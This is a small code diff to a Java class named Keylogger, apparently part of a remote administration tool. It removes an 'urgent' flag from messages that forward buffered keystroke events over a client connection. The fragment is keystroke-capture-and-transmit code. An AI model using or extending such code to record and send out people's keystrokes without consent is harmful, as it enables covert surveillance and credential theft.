@@ -186,10 +186,10 @@ public final class Keylogger {
 			}
 		} else {
 			while (diskBuffer.size() > 0) {
-				ClientStore.Connections.route(Message.newBuilder().setUrgent(true).setEvKevent(diskBuffer.remove(0)));
+				ClientStore.Connections.route(Message.newBuilder().setEvKevent(diskBuffer.remove(0)));
 			}
 			while (buffer.size() > 0) {
-				ClientStore.Connections.route(Message.newBuilder().setUrgent(true).setEvKevent(buffer.remove(0)));
+				ClientStore.Connections.route(Message.newBuilder().setEvKevent(buffer.remove(0)));
 			}
 		}
 
